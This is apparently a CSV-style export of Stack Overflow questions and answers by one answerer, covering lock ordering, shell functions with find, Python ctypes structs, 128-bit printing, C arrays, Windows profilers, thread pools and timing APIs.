","9530","","<p>You can avoid deadlock if you maintain a strict hierarchy of locks: if you're locking multiple nodes, always lock the ones closer to the head of the list first.  So, to delete an element, first lock the node's predecessor, then lock the node, then lock the node's successor, unlink the node, and then release the locks in reverse order.</p>

<p>This way, if multiple threads try to delete adjacent nodes simultaneously (say, nodes B and C in the chain A-B-C-D), then whichever thread first gets the lock to node B will be the one that will unlink first.  Thread 1 will lock A, then B, then C, and thread 2 will lock B, then C, then D.  There's only competition for B, and there's no way that thread 1 can hold a lock while waiting for a lock held by thread 2 and while thread 2 is waiting on the lock held by thread 1 (i.e. deadlock).</p>
"
"<p>Is there a way to get <code>find</code> to execute a function I define in the shell? For example:</p>

<pre><code>dosomething () {
  echo ""doing something with $1""
}
find . -exec dosomething {} \;
</code></pre>

<p>The result of that is:</p>

<pre><code>find: dosomething: No such file or directory
</code></pre>

<p>Is there a way to get <code>find</code>'s <code>-exec</code> to see <code>dosomething</code>?</p>
","9530","","<p>Since only the shell knows how to run shell functions, you have to run a shell to run a function.  You also need to mark your function for export with <code>export -f</code>, otherwise the subshell won't inherit them:</p>

<pre><code>export -f dosomething
find . -exec bash -c 'dosomething ""$0""' {} \;
</code></pre>
"
"<p>I've looked through other answers but can't seem to get this to work. I'm trying to call a function within a DLL for communicating with SMBus devices. This function takes a pointer to a struct, which has an array as one of it's fields. so...</p>

<p>In C:</p>

<pre><code>typedef struct _SMB_REQUEST
{
    unsigned char Address;
    unsigned char Command;
    unsigned char BlockLength;
    unsigned char Data[SMB_MAX_DATA_SIZE];
} SMB_REQUEST;
</code></pre>

<p>I think I have to set values for the Address, Command and BlockLength while the DLL fills the Data array.
The function that requires this struct takes it as a pointer</p>

<pre><code>SMBUS_API int SmBusReadByte( SMBUS_HANDLE handle, SMB_REQUEST *request );
</code></pre>

<p>So I've set up the struct in Python like so:</p>

<pre><code>class SMB_REQUEST(ctypes.Structure):
    _fields_ = [(""Address"", c_char),
            (""Command"", c_char),
            (""BlockLength"", c_char),
            (""Data"", type(create_string_buffer(SMB_MAX_DATA_SIZE))]
</code></pre>

<p>*Note: I've also tried ctypes.c_char*SMB_MAX_DATA_SIZE for the data type*</p>

<p>To pass a pointer to a struct of this type to the function I have tried to initialise it first as follows:</p>

<pre><code>data = create_string_buffer(SMB_MAX_DATA_SIZE)
smb_request = SMB_REQUEST('\x53', \x00', 1, data)
</code></pre>

<p>This responds with:</p>

<pre><code>TypeError: expected string or Unicode object, c_char_Array_32 found
</code></pre>

<p>If I try leaving out the data array, like so:</p>

<pre><code>smb_request = SMB_REQUEST('\x53', \x00', 1)
</code></pre>

<p>No, error.
However, then when I try to pass this to the function:</p>

<pre><code>int_response =  smbus_read_byte(smbus_handle, smb_request))
</code></pre>

<p>I get:</p>

<pre><code>ArgumentError: argument 2: &lt;type 'exceptions.TypeError'&gt;: expected LP_SMB_REQUES
T instance instead of SMB_REQUEST
</code></pre>

<p>I've tried passing it as a pointer:</p>

<pre><code>int_response =  smbus_read_byte(smbus_handle, ctypes.POINTER(smb_request))
</code></pre>

<p>and I get:</p>

<pre><code>----&gt; 1
      2
      3
      4
      5

TypeError: must be a ctypes type
</code></pre>

<p>Here's how I've set up the art types:</p>

<pre><code>smbus_read_byte.argtypes = (ctypes.c_void_p, ctypes.POINTER(SMB_REQUEST))
</code></pre>

<p>I've tried casting but still no go. Can anyone shed some light on this for me?</p>

<p><strong>Update:</strong></p>

<p>If I first initialise the struct like so:</p>

<pre><code>smb_request = SMB_REQUEST('\xA6', '\x00', chr(1), 'a test string')
</code></pre>

<p>and then bass by reference:</p>

<pre><code>int_response =  smbus_receive_byte(smbus_handle, ctypes.byref(smb_request))
</code></pre>

<p>I get no error. However, the function returns -1 when it should return '0' for success and non-zero for a fail. Checking the value of smb_request.Data gives back 'a test string' so no change there.
Any suggestions as to what might be going on here would be greatly appreciated.</p>

<p>Thanks</p>

<p><strong>UPDATE:</strong></p>

<p>Since I've gotten a couple of enquiries about whether my handle is correct, here's how I'm using it. The header file for the DLL declares the following:</p>

<pre><code>typedef void *SMBUS_HANDLE;

//
// This function call initializes the SMBus, opens the driver and 
// allocates the resources associated with the SMBus.
// All SMBus API calls are valid 
// after making this call except to re-open the SMBus.
//
SMBUS_API SMBUS_HANDLE OpenSmbus(void);
</code></pre>

<p>So here's how I'm doing this in python:</p>

<pre><code>smbus_handle = c_void_p() # NOTE: I have also tried it without this line but same result

open_smbus = CDLL('smbus.dll').OpenSmbus
smbus_handle =  open_smbus()
print 'SMBUS_API SMBUS_HANDLE OpenSmbus(void): ' + str(smbus_handle)
</code></pre>

<p>I call this before making the call to smbus_read_byte(). I have tried to set <code>open_smbus.restype = c_void_p()</code> but I get an error: <code>TypeError: restype must be a type, a callable, or None</code></p>
","9530","","<p>You're almost there.  You should use <code>c_char * SMB_MAX_DATA_SIZE</code> as the type for the definition of <code>Data</code>.  This works for me on Mac OS X:</p>

<p>Shared library:</p>

<pre><code>$ cat test.c
#include &lt;stdio.h&gt;

#define SMB_MAX_DATA_SIZE 16

typedef struct _SMB_REQUEST
{
  unsigned char Address;
  unsigned char Command;
  unsigned char BlockLength;
  unsigned char Data[SMB_MAX_DATA_SIZE];
} SMB_REQUEST;

int SmBusReadByte(void *handle, SMB_REQUEST *request)
{
  printf(""SmBusReadByte: handle=%p request=[%d %d %d %s]\n"", handle, 
      request-&gt;Address, request-&gt;Command, request-&gt;BlockLength, request-&gt;Data);
  return 13;
}

$ gcc test.c -fPIC -shared -o libtest.dylib
</code></pre>

<p>Python driver:</p>

<pre><code>$ cat test.py
import ctypes

SMB_MAX_DATA_SIZE = 16

class SMB_REQUEST(ctypes.Structure):
    _fields_ = [(""Address"", ctypes.c_ubyte),
                (""Command"", ctypes.c_ubyte),
                (""BlockLength"", ctypes.c_ubyte),
                (""Data"", ctypes.c_char * SMB_MAX_DATA_SIZE)]

libtest = ctypes.cdll.LoadLibrary('libtest.dylib')

req = SMB_REQUEST(1, 2, 3, 'test')

result = libtest.SmBusReadByte(ctypes.c_voidp(0x12345678), ctypes.byref(req))

print 'result: %d' % result

$ python test.py
SmBusReadByte: handle=0x12345678 request=[1 2 3 test]
result: 13
</code></pre>

<hr>

<p><strong>UPDATE</strong></p>

<p>You're having problems because you need to set the result type of <code>open_smbus</code> to <code>void*</code>.  By default, ctypes assumes that functions return <code>int</code>s.  You need to say this:</p>

<pre><code>open_smbus.restype = ctypes.c_void_p
</code></pre>

<p>You were getting an error because you were using <code>c_void_p()</code> (note the extra parentheses).  There's an important distinction between <code>c_void_p</code> and <code>c_void_p()</code>.  The former is a <em>type</em>, and the latter is an <em>instance</em> of a type.  <code>c_void_p</code> represents the C type <code>void*</code>, whereas <code>c_void_p()</code> represents an actual pointer instance (with a default value of 0).</p>
"
"<p>I have the following example from <a href=""http://zetcode.com/tutorials/gtktutorial/firstprograms/"" rel=""nofollow"">here</a>, it shows this under the ""Increase - Decrease"" title. </p>

<pre><code>#include &lt;gtk/gtk.h&gt;

gint count = 0;
char buf[5];

void increase(GtkWidget *widget, gpointer label)
{
  count++;

  sprintf(buf, ""%d"", count);
  gtk_label_set_text(label, buf);
}

void decrease(GtkWidget *widget, gpointer label)
{
  count--;

  sprintf(buf, ""%d"", count);
  gtk_label_set_text(label, buf);
}

int main(int argc, char** argv) {

  GtkWidget *label;
  GtkWidget *window;
  GtkWidget *frame;
  GtkWidget *plus;
  GtkWidget *minus;

  gtk_init(&amp;argc, &amp;argv);

  window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
  gtk_window_set_position(GTK_WINDOW(window), GTK_WIN_POS_CENTER);
  gtk_window_set_default_size(GTK_WINDOW(window), 250, 180);
  gtk_window_set_title(GTK_WINDOW(window), ""+-"");

  frame = gtk_fixed_new();
  gtk_container_add(GTK_CONTAINER(window), frame);

  plus = gtk_button_new_with_label(""+"");
  gtk_widget_set_size_request(plus, 80, 35);
  gtk_fixed_put(GTK_FIXED(frame), plus, 50, 20);

  minus = gtk_button_new_with_label(""-"");
  gtk_widget_set_size_request(minus, 80, 35);
  gtk_fixed_put(GTK_FIXED(frame), minus, 50, 80);

  label = gtk_label_new(""0"");
  gtk_fixed_put(GTK_FIXED(frame), label, 190, 58); 

  gtk_widget_show_all(window);

  g_signal_connect(window, ""destroy"",
      G_CALLBACK (gtk_main_quit), NULL);

  g_signal_connect(plus, ""clicked"", 
      G_CALLBACK(increase), label);

  g_signal_connect(minus, ""clicked"", 
      G_CALLBACK(decrease), label);

  gtk_main();

  return 0;
}
</code></pre>

<p>what I'm wondering is, the <code>g_signal_connect(plus, ""clicked"",G_CALLBACK(increase), label);</code> function sends the ""label""  to the function increase, where its arguments are <code>void increase(GtkWidget *widget, gpointer label)</code>. Now in the increase function the <code>gtk_label_set_text()</code> function requires a data type of <code>GtkLabel</code> as its first argument but I only see a <code>GtkWidget</code> variable and a void pointer <code>label</code> as the arguments to the increase function. If that is so how does the gtk_label_set_text() work?.</p>
","9530","","<p>In C (but <em>not</em> C++), you can implicitly cast a <code>void*</code> to a pointer to any other type.  It's very commonly seen when allocating memory with <code>malloc</code>, which returns a <code>void*</code>:</p>

<pre><code>int *myIntArray = malloc(10 * sizeof(int));  // allocate array of 10 ints
</code></pre>

<p>Your code is doing the same thing, just with parameter passing:</p>

<pre><code>void gtk_label_set_text(GtkLabel *label, const char *text);
void *label = ...;
gtk_label_set_text(label, ""some string"");  // label is implicitly cast from
                                           // void* to GtkLabel*
</code></pre>
"
"<p>I am using this struct to represent 128bit integers:</p>

<pre><code>typedef struct {
    uint64_t low, high;
} uint128;
</code></pre>

<p>(Unless you can point me to a fast 128bit integer library I can not change that)</p>

<p>Now I want to print such a value in base 10, using <code>printf</code>. I probably need division by 10 to do that, but no division is implemented yet. </p>

<p>How can I do this? The solution does not have to be super efficient, as long as it works.</p>

<p>EDIT: I like all solutions you came up with. You are awesome.</p>
","9530","","<p>Assuming you've already implemented functions to perform math on <code>uint128</code>, you could break the number up into 3 parts and use the built-in 64-bit printing capabilities of printf.  Since the largest 64-bit number is 20 digits long, that means all 19-digit decimal numbers can be printed that way, but since the largest 128-bit number is 39 digits long, we can't break it up into only 2 parts, since there's a chance that we might end up with a 20 digit number bigger than the largest 64-bit number.</p>

<p>Here's one way to do it, dividing first by 10<sup>20</sup> to get a quotient no larger than 3,402,823,669,209,384,634.  We then divide the remainder (itself no larger than 10<sup>20</sup>) by 10<sup>10</sup> to get another quotient and remainder each less than 10<sup>20</sup>, which both fit in a 64-bit integer.</p>

<pre><code>void print_uint128(uint128 value)
{
    // First power of 10 larger than 2^64
    static const uint128 tenToThe20 = {7766279631452241920ull, 5ull};
    static const uint128 tenToThe10 = {10000000000ull, 0ull};

    // Do a 128-bit division; assume we have functions to divide, multiply, and
    // subtract 128-bit numbers
    uint128 quotient1 = div128(value, tenToThe20);
    uint128 remainder1 = sub128(value, mul128(quotient, tenToThe20));
    uint128 quotient2 = div128(remainder1, tenToThe10);
    uint128 remainder2 = sub128(remainder1, mul128(remainder1, tenToThe10));

    // Now print out theresult in 3 parts, being careful not to print
    // unnecessary leading 0's
    if(quotient1.low != 0)
        printf(""%llu%010llu%010llu"", quotient1.low, quotient2.low, remainder2.low);
    else if(quotient2.low != 0)
        printf(""%llu%010llu"", quotient2.low, remainder2.low);
    else
        printf(""%llu"", remainder2.low);
}
</code></pre>
"
"<p>First off, I <strong>want</strong> it to stop on warnings.   But I also want to print out some informative messages (like ""Come back and implement this!"").</p>

<p>Unfortunately, my compiler doesn't support <code>#info</code>, <code>#message</code>, <code>#pragma message()</code>, etc.</p>

<p>I know there's <code>-Wno-error=&lt;something&gt;</code>, but my google-foo is weak, and I can't seem to find out the <code>&lt;something&gt;</code> for <code>#warning</code>.  I've tried <code>-Wno-error=warning</code>, and that just says ""there's no <code>-Wwarning</code>"".  Same with ""<code>warn</code>"".</p>

<p>Any suggestions?</p>

<p>For what its worth, I'm using the Tensilica xtensa compiler, xt-xcc, which appears to be a gnu derivative, or at least uses the gnu front end.  It's version 8.0.0.</p>
","9530","","<p>If your compiler supports it, you can try using the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html#index-g_t_0040code_007bconstructor_007d-function-attribute-2403"" rel=""nofollow""><code>constructor</code> function attribute</a> to define a function that runs at program start (before <code>main</code>) that prints out a message to stdout:</p>

<pre><code>#define TOKENPASTE(x, y) TOKENPASTE2(x, y)
#define TOKENPASTE2(x, y) x ## y
#define WARNING(message) \
  static void TOKENPASTE(_print_warning, __LINE__)() __attribute__((constructor)); \
  static void TOKENPASTE(_print_warning, __LINE__)() \
  { \
    puts(message); \
  }

WARNING(""fix this before ship"")  // prints out a message at runtime before main
</code></pre>

<p>This causes a message to be printed out at runtime instead of compile-time, which is almost as good, especially if you have no other options.  The only restriction is that you have to use this at global scope outside of a function definition.</p>
"
"<p>I'm  Java programmer and I'm struggling with this simple stuff.</p>

<p>How can I return this multidimensional array? Does it have to return a ** pointer? How can I get it in another file?</p>

<pre><code>static MoveDirection ghost_moves[GHOSTS_SIZE][4];

MoveDirection** get_ghost_moves() {
    return ghost_moves;
}
</code></pre>
","9530","","<p>A 2D array is not a pointer to a pointer.  Arrays and pointers are fundamentally different types in C and C++.  An array <em>decays</em> into a pointer to its first element (hence the frequent confusion between the two), but it only decays at the first level: if you have a multidimensional array, it decays into a pointer to an array, not a pointer to a pointer.</p>

<p>The proper declaration of <code>get_ghost_moves</code> is to declare it as returning a pointer to an array:</p>

<pre><code>static MoveDirection ghost_moves[GHOSTS_SIZE][4];

// Define get_ghost_moves to be a function returning ""pointer to array 4 of MoveDirection""
MoveDirection (*get_ghost_moves())[4] {
    return ghost_moves;
}
</code></pre>

<p>This syntax syntax is extremely confusing, so I recommend making a typedef for it:</p>

<pre><code>// Define MoveDirectionArray4 to be an alias for ""array of 4 MoveDirections""
typedef MoveDirection MoveDirectionArray4[4];

MoveDirectionArray4 *get_ghost_moves() {
    return ghost_moves;
}
</code></pre>
"
"<p>I am trying to write some code to optimize some Open GL functions for a program I'm writing, unfortunately, I am not exactly a C or C++ veteran, but that's partially why I'm doing this project!</p>

<p>So I'm creating a struct to handle 3x3 matrices and I am defining the struct as follows:</p>

<pre><code>#ifndef MATRIX3BY3_H
#define MATRIX3BY3_H
struct Matrix3by3
{
    float ix, jx, kx;
    float iy, jy, ky;
    float iz, jz, kz;

    Matrix3by3() {}

    Matrix3by3(const Matrix3by3 &amp;matrix)
    {
        ix = matrix.ix;
        jx = matrix.jx;
        kx = matrix.kx;

        iy = matrix.iy;
        jy = matrix.jy;
        ky = matrix.ky;

        iz = matrix.iz;
        jz = matrix.jz;
        kz = matrix.kz;
    }

    Matrix3by3 (const float _ix, const float _jx, const float _kx,
                const float _iy, const float _jy, const float _ky,
                const float _iz, const float _jz, const float _kz) :
        ix(_ix), jx(_jx), kx(_kx),
        iy(_iy), jy(_jy), ky(_ky),
        iy(_iz), jx(_jz), kz(_kz) {}
    }; 
#endif
</code></pre>

<p>And I get the error (twice) </p>

<blockquote>
  <p>Expected specifier-qualifier-list
  before 'Matrix3by3'</p>
</blockquote>

<p>On the line of the first constructor. I have tried to look around for answers for this, and it seems that it has to do with the compiler not knowing that this is a type. So I have tried the following, I'll remove the innards for brevity:</p>

<pre><code>typedef struct Matrix3by3 { ... };
</code></pre>

<hr>

<pre><code>struct Matrix3by3 { struct Matrix3by3() {} ... };
</code></pre>

<hr>

<pre><code>struct Matrix3by3 { ... } Matrix3by3;
</code></pre>

<hr>

<pre><code>typdef struct Matrix3by3;
struct Matrix3by3 { ... };
</code></pre>

<p>Which are all solutions that were suggested on blogs and articles that I saw for this error. I also saw that it may arise because of a circular dependency, but this file has no includes that include anything else, and I've even removed them just to be certain from time to time - no change.</p>

<p>I could write this in a objective-c class, I'm sure, but it will probably take a tiny bit more memory and cycles, and that's exactly what I'm trying to avoid. The only thing I can think of left is some compiler/project setting that I have set by default that precludes my using this type of structure. Entirely possible, as I'm learning the language/environment.</p>

<p>Can any one provide some help?</p>

<p>Thanks!</p>
","9530","","<p>C does not support constructors or member functions of structs.  There is no way you will get this to compile as C or Objective-C.  You need to compile this as C++ or Objective-C++, at which point it will almost compile: you have an error in your 3rd constructor, in that you're attempting to initialize the members <code>iy</code> and <code>jx</code> multiple times.  Once you fix those typos, it compiles just fine.</p>
"
"<p>I have an error with this codie.</p>

<p>'midiInGetID' : cannot convert parameter 2 from 'int *' to 'LPUINT'
What does <code>int *</code> and <code>LPUNIT</code> mean?</p>

<pre><code>struct midi_in_list_node
{
    int midi_in_number;
    HMIDIIN midi_in;
    struct midi_in_list_node *next_midi_in_list_node;
};

struct midi_in_list_node *first_midi_in_list_node = NULL;

void CALLBACK midi_in_handler(HMIDIIN midi_in, UINT msg_type, DWORD user_data, DWORD midi_msg, DWORD param2)
{
    int midi_in_number;

    midiInGetID(midi_in, &amp;midi_in_number);

    if (msg_type == MIM_DATA)
    {
</code></pre>

<p>After changing to UINT, I have other error:</p>

<pre><code>1&gt;------ Build started: Project: MIDI, Configuration: Debug Win32 ------
1&gt;Compiling...
1&gt;MIDI.cpp
1&gt;c:\users\wildfire\documents\visual studio 2008\projects\midi\midi\midi.cpp(103) : warning C4996: 'sscanf': This function or variable may be unsafe. Consider using sscanf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.
1&gt;        c:\program files (x86)\microsoft visual studio 9.0\vc\include\stdio.h(324) : see declaration of 'sscanf'
1&gt;Linking...
1&gt;MIDI.obj : error LNK2019: unresolved external symbol __imp__midiInGetID@8 referenced in function ""void __stdcall midi_in_handler(struct HMIDIIN__ *,unsigned int,unsigned long,unsigned long,unsigned long)"" (?midi_in_handler@@YGXPAUHMIDIIN__@@IKKK@Z)
1&gt;MIDI.obj : error LNK2019: unresolved external symbol __imp__midiInClose@4 referenced in function ""int __stdcall control_handler(unsigned long)"" (?control_handler@@YGHK@Z)
1&gt;MIDI.obj : error LNK2019: unresolved external symbol __imp__midiInStop@4 referenced in function ""int __stdcall control_handler(unsigned long)"" (?control_handler@@YGHK@Z)
1&gt;MIDI.obj : error LNK2019: unresolved external symbol __imp__midiInStart@4 referenced in function _main
1&gt;MIDI.obj : error LNK2019: unresolved external symbol __imp__midiInOpen@20 referenced in function _main
1&gt;C:\Users\Wildfire\Documents\Visual Studio 2008\Projects\MIDI\Debug\MIDI.exe : fatal error LNK1120: 5 unresolved externals
1&gt;Build log was saved at ""file://c:\Users\Wildfire\Documents\Visual Studio 2008\Projects\MIDI\MIDI\Debug\BuildLog.htm""
1&gt;MIDI - 6 error(s), 1 warning(s)
========== Build: 0 succeeded, 1 failed, 0 up-to-date, 0 skipped ==========
</code></pre>
","9530","","<p>In response to your new problems, you need to link your project against the <code>winmm.lib</code> static library.  To do that, open up your <strong>Project Settings</strong> and go to <strong>Linker</strong> → <strong>Input</strong> → <strong>Additional Dependencies</strong> and add <code>winmm.lib</code> to that text box.</p>

<p>When you get errors like ""Unresolved external symbol"", that means you're not linking against the correct library.  To figure out what the correct library is, look at the documentation (e.g. <a href=""http://msdn.microsoft.com/en-us/library/dd798455%28VS.85%29.aspx"" rel=""nofollow"">here</a> is the documentation for <code>midiInGetID</code>).  Under the section <strong>Requirements</strong>, it lists <code>winmm.lib</code> as the required library.</p>
"
"<h1>A Hacker's Tale</h1>

<p>The date is 12/02/10.  The days before Christmas are dripping away and I've pretty much hit a major road block as a windows programmer.  I've been using AQTime, I've tried sleepy, shiny, and very sleepy, and as we speak, VTune is installing.  I've tried to use the VS2008 profiler, and it's been positively punishing as well as often insensible.  I've used the random pause technique.  I've examined call-trees.  I've fired off function traces.  But the sad painful fact of the matter is that the app I'm working with is over a million lines of code, with probably another million lines worth of third-party apps.</p>

<p>I need better tools.  <em>I've read the other topics.</em>  I've tried out each profiler listed in each topic.  There simply has to be something better than these junky and expensive options, or ludicrous amounts of work for almost no gain.  To further complicate matters, our code is heavily threaded, and runs a number of Qt Event loops, some of which are so fragile that they crash under heavy instrumentation due to timing delays.  Don't ask me why we're running multiple event loops.  No one can tell me.</p>

<p>Are there any options more along the lines of Valgrind in a windows environment?<br>
Is there anything better than the long swath of broken tools I've already tried?<br>
Is there anything designed to integrate with Qt, perhaps with a useful display of events in queue?   </p>

<p>A full list of the tools I tried, with the ones that were really useful in italics:</p>

<ul>
<li><em>AQTime:</em> Rather good!  Has some trouble with deep recursion, but the call graph is correct in these cases, and can be used to clear up any confusion you might have.  Not a perfect tool, but worth trying out.  It might suit your needs, and it certainly was good enough for me most of the time.</li>
<li><em>Random Pause attack in debug mode:</em> Not enough information enough of the time.<br>
A good tool but not a complete solution.</li>
<li><em>Parallel Studios:</em>  The nuclear option.  Obtrusive, weird, and crazily powerful.  I think you should hit up the 30 day evaluation, and figure out if it's a good fit. It's just darn cool, too.</li>
<li><em>AMD Codeanalyst:</em>  Wonderful, easy to use, very crash-prone, but I think that's an environment thing.  I'd recommend trying it, as it is free.</li>
<li><em>Luke Stackwalker:</em> Works fine on small projects, it's a bit trying to get it working on ours.  Some good results though, and it definitely replaces Sleepy for my personal tasks.</li>
<li><em>PurifyPlus:</em> No support for Win-x64 environments, most prominently Windows 7.  Otherwise excellent.  A number of my colleagues in other departments swear by it.</li>
<li>VS2008 Profiler: Produces output in the 100+gigs range in function trace mode at the required resolution.  On the plus side, produces solid results.</li>
<li>GProf: Requires GCC to be even moderately effective.</li>
<li>VTune: VTune's W7 support borders on criminal. Otherwise excellent</li>
<li>PIN: I'd need to hack up my own tool, so this is sort of a last resort.</li>
<li>Sleepy\VerySleepy: Useful for smaller apps, but failing me here.</li>
<li>EasyProfiler: Not bad if you don't mind a bit of manually injected code to indicate where to instrument.</li>
<li>Valgrind: *nix only, but very good when you're in that environment.</li>
<li>OProfile: Linux only.</li>
<li>Proffy: They shoot wild horses.</li>
</ul>

<p>Suggested tools that I haven't tried:  </p>

<ul>
<li>XPerf:  </li>
<li>Glowcode:  </li>
<li>Devpartner:  </li>
</ul>

<p><strong>Notes:</strong>
Intel environment at the moment.  VS2008, boost libraries.  Qt 4+.  And the wretched humdinger of them all: Qt/MFC integration via trolltech.
<hr/>
<strong>Now:</strong> Almost two weeks later, it looks like my issue is resolved.  Thanks to a variety of tools, including almost everything on the list and a couple of my personal tricks, we found the primary bottlenecks.  However, I'm going to keep testing, exploring, and trying out new profilers as well as new tech.  Why?  Because I owe it to you guys, because you guys rock.  It does slow the timeline down a little, but I'm still very excited to keep trying out new tools.</p>

<p><strong>Synopsis</strong><br>
Among many other problems, a number of components had recently been switched to the incorrect threading model, causing serious hang-ups due to the fact that the code underneath us was suddenly no longer multithreaded.  I can't say more because it violates my NDA, but I can tell you that this would never have been found by casual inspection or even by normal code review.  Without profilers, callgraphs, and random pausing in conjunction, we'd still be screaming our fury at the beautiful blue arc of the sky.  Thankfully, I work with some of the best hackers I've ever met, and I have access to an amazing 'verse full of great tools and great people.</p>

<p>Gentlefolk, I appreciate this tremendously, and only regret that I don't have enough rep to reward each of you with a bounty.  I still think this is an important question to get a better answer to than the ones we've got so far on SO.  </p>

<p>As a result, each week for the next three weeks, I'll be putting up the biggest bounty I can afford, and awarding it to the answer with the nicest tool that I think isn't common knowledge.  After three weeks, we'll hopefully have accumulated a definitive profile of the profilers, if you'll pardon my punning.</p>

<p><strong>Take-away</strong><br>
Use a profiler.  They're good enough for Ritchie, Kernighan, Bentley, and Knuth. I don't care who you think you are.  Use a profiler.  If the one you've got doesn't work, find another.  If you can't find one, code one.  If you can't code one, or it's a small hang up, or you're just stuck, use random pausing.  If all else fails, hire some grad students to bang out a profiler.</p>

<p><hr/>
<strong>A Longer View</strong><br>
So, I thought it might be nice to write up a bit of a retrospective.  I opted to work extensively with Parallel Studios, in part because it is actually built on top of the PIN Tool.  Having had academic dealings with some of the researchers involved, I felt that this was probably a mark of some quality.  Thankfully, I was right.  While the GUI is a bit dreadful, I found IPS to be incredibly useful, though I can't comfortably recommend it for everyone.  Critically, there's no obvious way to get line-level hit counts, something that AQT and a number of other profilers provide, and I've found very useful for examining rate of branch-selection among other things.  In net, I've enjoyed using AQTime as well, and I've found their support to be really responsive.  Again, I have to qualify my recommendation:  A lot of their features don't work that well, and some of them are downright crash-prone on Win7x64.  XPerf also performed admirably, but is agonizingly slow for the sampling detail required to get good reads on certain kinds of applications.  </p>

<p>Right now, I'd have to say that I don't think there's a definitive option for profiling C++ code in a W7x64 environment, but there are certainly options that simply fail to perform any useful service.</p>
","9530","","<p>I've had some success with <a href=""http://developer.amd.com/cpu/codeanalyst/Pages/default.aspx"">AMD CodeAnalyst</a>.</p>
"
"<p>Program A, is a c program that endlessly, receives input in stdin, process it and output it to stdout.</p>

<p>I want to write program B (in python) so it will reads A's output, and feed it back with whatever is needed. 
Note there must be only one instance of each of those programs, so given b1 and b2 which are instances of b instead of:</p>

<pre><code>$ b1 | a | b2
</code></pre>

<p>I need to have </p>

<pre><code>$ b1 | a | b1 
</code></pre>

<p>The following is the diagram of the final desired result:</p>

<p><img src=""http://i.stack.imgur.com/ArNR4.png"" alt=""alt text""></p>
","9530","","<p>Use the <a href=""http://docs.python.org/library/subprocess.html#subprocess.Popen"" rel=""nofollow""><code>subprocess.Popen</code></a> class to create a subprocess for program A.  For example:</p>

<pre><code>import subprocess
import sys

# Create subprocess with pipes for stdin and stdout
progA = subprocess.Popen(""a"", stdin=subprocess.PIPE, stdout=subprocess.PIPE)

# Reassign the pipes to our stdin and stdout
sys.stdin = progA.stdout
sys.stdout = progA.stdin
</code></pre>

<p>Now the two processes can communicate back and forth with each other via the pipes.  It might also be a good idea to save the original <code>sys.stdin</code> and <code>sys.stdout</code> into other variables so that if you ever decide to terminate the subprocess, you can restore stdin and stdout to their original states (e.g. the terminal).</p>
"
"<p>I have POSIX in mind for implementation, though this question is more about architecture.</p>

<p>I am starting from an update loop that has several main jobs to do.  I can group those jobs into four or five main tasks that have common memory access requirements.  It's my idea to break off those jobs into their own threads and have them complete one cycle of ""update"" and sleep until the next frame.</p>

<p>But how to synchronize?  If I detach four or five threads at the start of each cycle, have them run once, die, and then detach another 4-5 threads on each pass?  That sounds expensive.</p>

<p>It sounds more reasonable to create these threads once, and have them go to sleep until a synchronized call wakes it up.</p>

<p>Is this a wise approach?  I'm open to accepting responses from just ideas to implementations of any kind. </p>

<p>EDIT: based on the answers so far, I'd like to add:</p>

<ul>
<li>concurrency is desired</li>
<li>these worker threads are intended to run at very short durations &lt;250ms</li>
<li>the work done by each thread will always be the same</li>
<li>i'm considering 4-5 threads, 20 being a hard limit.</li>
</ul>
","9530","","<p>That depends on the granularity of the tasks that the threads are performing.  If they're doing long tasks (e.g. a second or longer), then the cost of creating and destroying threads is negligible compared to the work the threads are doing, so I'd recommend keeping things simple and creating the threads on demand.</p>

<p>Conversely, if you have very short tasks (e.g. less than 10-100 ms or so), you will definitely start to notice the cost of creating and destroying lots of threads.  In that case, yes, you should create the threads only once and have them sleep until work arrives for them.  You'll want to use some sort of <a href=""http://en.wikipedia.org/wiki/Condition_variable"" rel=""nofollow"">condition variable</a> (e.g. <code>pthread_cond_t</code>) for this: the thread waits on the condition variable, and when work arrives, you signal the condition variable.</p>
"
"<p>I want to measure in milliseconds how much time there is between when I start my application and another time, for example 16:00 o'clock. What is the best way to do this?</p>

<p>I looked around ""clock"" function but it's not what I need.</p>

<p>Operating system: Win NT and above</p>
","9530","","<p>If you're on a POSIX system, you can use <a href=""http://linux.die.net/man/3/gettimeofday"" rel=""nofollow""><code>gettimeofday(3)</code></a>:</p>

<pre><code>struvt timeval start, end;
gettimeofday(&amp;start, NULL);
...
gettimeofday(&amp;end, NULL);

// Watch out for overflow!
int delta_milliseconds = 1000 * (end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec)/1000;
</code></pre>

<p>If you're on Windows, you can use <a href=""http://msdn.microsoft.com/en-us/library/ms724408%28v=vs.85%29.aspx"" rel=""nofollow""><code>GetTickCount</code></a>:</p>

<pre><code>DWORD start, end;
start = GetTickCount();
...
end = GetTickCount();
int delta_milliseconds = end - start;
</code></pre>

<p>But but aware that <code>GetTickCount</code> only has a resolution of about 10-16 ms.  If you need more precision, use <a href=""http://msdn.microsoft.com/en-us/library/ms644904%28v=vs.85%29.aspx"" rel=""nofollow""><code>QueryPerformanceCounter</code></a> and <a href=""http://msdn.microsoft.com/en-us/library/ms644905%28v=vs.85%29.aspx"" rel=""nofollow""><code>QueryPerformanceFrequency</code></a> instead:</p>

<pre><code>// Error-checking omitted for expository purposes
LARGE_INTEGER freq, start, end;
QueryPerformanceFrequency(&amp;freq);
QueryPerformanceCounter(&amp;start);
...
QueryPerformanceCounter(&amp;end);
double delta_milliseconds = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart * 1000.0;
</code></pre>
"
"<p>In my app, I am trying to perform an operation on a string when the user enters text. In the viewDidLoad method:</p>

<pre><code>[textView addTarget:self action:@selector(textFieldDidChange:) forControlEvents:UIControlEventEditingChanged];
</code></pre>

<p>Here is the declaration for that method:</p>

<pre><code>-(void)textFieldDidChange:(id)sender {
 sender = (UITextField *)sender;
 [self operationForInput:sender.text inTextField:sender];
}
</code></pre>

<p>But when I try to compile, it gives me the ""Request for member 'text' in something not a structure on union"" error. What am I doing wrong?</p>
","9530","","<p>The local variable <code>sender</code> is of type <code>id</code>.  You're trying to access the <code>text</code> property of <code>sender</code>, which doesn't exist in <code>id</code> (it's a property of <code>UITextField</code>).</p>

<p>The line <code>sender = (UITextField *)sender</code> is useless—you downcast from <code>id</code> to <code>UITextField*</code>, but then when you assign back to <code>sender</code>, you're upcasting back to <code>id</code>.  You should change your code to this:</p>

<pre><code>UITextField *textField = sender;  // casts from id to other types are implicit
[self operationForInput:textField.text inTextField:textField];
</code></pre>
"
"<blockquote>
